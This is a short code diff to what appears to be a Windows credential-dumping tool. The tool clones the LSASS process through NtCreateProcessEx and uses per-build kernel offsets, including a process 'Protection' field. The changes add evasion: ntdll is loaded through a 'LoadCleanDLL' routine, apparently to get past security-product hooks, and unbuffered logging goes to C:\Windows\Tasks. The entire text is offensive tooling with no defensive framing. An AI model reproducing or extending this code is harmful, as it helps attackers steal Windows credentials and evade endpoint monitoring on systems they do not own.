@@ -248,7 +248,7 @@ Offsets getOffsets() {
         offs.Protection = 0x5fa;
     }
     else {
-        wprintf(L"[ERROR] Offsets not defined for build %d on x64.\n", build);
+        fwprintf(logfile, L"[ERROR] Offsets not defined for build %d on x64.\n", build);
         exit(1);
     }
     return offs;
@@ -696,7 +696,7 @@ HANDLE CloneLsassProcess() {
         return NULL;
     }
 
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    HMODULE ntdll = LoadCleanDLL("ntdll.dll");
     if (!ntdll) return NULL;
 
     _NtCreateProcessEx NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(ntdll, "NtCreateProcessEx");
@@ -752,6 +752,9 @@ int main(void)
     // Logs
     logfile = fopen("C:\\Windows\\Tasks\\log.txt", "a");
 
+    // Disabling buffering
+    setvbuf(logfile, NULL, _IONBF, 0);
+    
     // Initialize STARTUPINFO and PROCESS_INFORMATION structures.
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
